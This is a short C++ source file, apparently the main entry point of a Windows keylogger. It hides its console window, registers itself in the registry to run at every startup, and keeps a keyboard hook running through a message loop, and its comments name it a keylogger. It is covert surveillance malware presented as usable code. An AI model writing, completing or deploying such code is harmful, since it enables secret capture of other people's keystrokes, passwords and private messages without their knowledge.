#pragma once

#include "KeybHook.h"
#include "RunOnStartup.h"

static void hide();

int main()
{
	
	hide(); // hide console window
	addToStartup(); // starts keylogger at startup by adding it to the registry -> located in RunOnStartup.h
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}

static void hide()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}
